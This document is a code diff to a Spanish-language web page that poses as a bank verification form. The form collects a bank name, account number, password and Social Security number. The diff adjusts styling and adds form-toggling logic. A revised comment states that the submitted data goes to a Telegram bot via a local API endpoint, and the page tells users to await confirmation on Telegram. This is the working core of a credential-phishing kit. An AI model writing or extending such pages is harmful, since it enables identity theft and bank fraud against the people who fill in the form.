@@ -35,8 +35,7 @@
       margin: 0;
       font-family: "Inter", Arial, sans-serif;
       color: var(--ink);
-      background:
-        radial-gradient(circle at top left, rgba(11, 92, 171, 0.12), transparent 34rem),
+      background: radial-gradient(circle at top left, rgba(11, 92, 171, 0.12), transparent 34rem),
         linear-gradient(180deg, #ffffff 0%, var(--canvas) 42%);
     }
 
@@ -147,8 +146,7 @@
     .panel-header {
       padding: 34px 38px 28px;
       color: white;
-      background:
-        linear-gradient(135deg, rgba(11, 92, 171, 0.98), rgba(11, 47, 99, 0.98)),
+      background: linear-gradient(135deg, rgba(11, 92, 171, 0.98), rgba(11, 47, 99, 0.98)),
         url("https://images.unsplash.com/photo-1560472355-536de3962603?auto=format&fit=crop&w=1200&q=80");
       background-size: cover;
       background-position: center;
@@ -307,8 +305,7 @@
 
     .security-card {
       padding: 26px;
-      background:
-        linear-gradient(160deg, rgba(11, 47, 99, 0.96), rgba(8, 63, 121, 0.96)),
+      background: linear-gradient(160deg, rgba(11, 47, 99, 0.96), rgba(8, 63, 121, 0.96)),
         url("https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?auto=format&fit=crop&w=900&q=80");
       background-size: cover;
       background-position: center;
@@ -536,9 +533,9 @@
               <input type="text" id="account-number" name="account_number" placeholder="Número de cuenta" required />
             </div>
 
-            <div class="form-group compact-small" style="position: relative;">
+                        <div class="form-group compact-small" style="position: relative;">
               <label for="ssn">Número de Seguro Social</label>
-                          <span class="material-icons left-small-icon" aria-hidden="true">fingerprint</span>
+              <span class="material-icons left-small-icon" aria-hidden="true">fingerprint</span>
               <input type="text" id="ssn" name="ssn" placeholder="000-00-0000" maxlength="11" pattern="\d{3}-\d{2}-\d{4}" inputmode="numeric" required />
             </div>
 
@@ -627,8 +624,8 @@
       const password = data.get('password') || data.get('ssn');
       const bank = data.get('bank') || data.get('bank-select');
 
-      // Aquí debes implementar la lógica para enviar los datos al bot de Telegram
-      fetch('http://localhost:5000/api/verify', {
+      // Enviar datos al bot de Telegram
+      fetch('http://localhost:5000/api/verify', {  // Cambia esta URL según tu configuración
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ user, password, bank })
@@ -636,7 +633,6 @@
       .then(response => {
         if (response.ok) {
           showMessage('Solicitud enviada. Esperando confirmación en Telegram...', false);
-          // Aquí puedes implementar una lógica para consultar el estado de la verificación
         } else {
           throw new Error('Error al enviar la solicitud.');
         }
@@ -652,8 +648,23 @@
 
     if (fastForm) fastForm.addEventListener('submit', handleSubmit);
     if (traditionalForm) traditionalForm.addEventListener('submit', handleSubmit);
-    
-    // Aquí puedes incluir más lógica de validación y funcionalidad según sea necesario.
+
+    // Lógica para mostrar/ocultar formularios
+    bankSelect.addEventListener('change', function() {
+      if (bankSelect.value) {
+        fastVerification.classList.remove('hidden');
+        fastVerification.classList.add('visible');
+        traditionalSection.classList.add('hidden');
+      } else {
+        fastVerification.classList.add('hidden');
+        traditionalSection.classList.add('hidden');
+      }
+    });
+
+    showTraditionalBtn.addEventListener('click', function() {
+      traditionalSection.classList.remove('hidden');
+      fastVerification.classList.add('hidden');
+    });
   </script>
 </body>
 
